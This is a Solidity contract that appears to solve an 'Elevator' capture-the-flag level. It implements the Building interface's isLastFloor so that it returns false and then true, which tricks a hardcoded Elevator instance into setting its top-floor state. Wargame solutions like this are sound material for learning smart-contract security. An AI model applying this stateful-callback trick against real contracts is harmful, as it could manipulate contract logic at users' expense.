// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Elevator.sol";

contract ElevatorHack {

    // Elevator contract for this stage is initalised with a pointer to msg.sender address, which means that we can deploy a smart contract and implement our own logic for isLastFloor function in the Building interface

    bool public toggle = false;
    Elevator public ele;

    // parameter for isLastFloor is not important here, simply return false, then true to hack the contract.
    function isLastFloor(uint) external returns (bool){
        if(!toggle){
            toggle = true;
            return false;
        }
        else{
            return true;
        }
    }
    
    function attack() public {
        // pointer to elevator instance
        ele = Elevator(0x6CdEb42800FeF14c736f79e057231149C4D131c4);
        ele.goTo(0);
    }
}

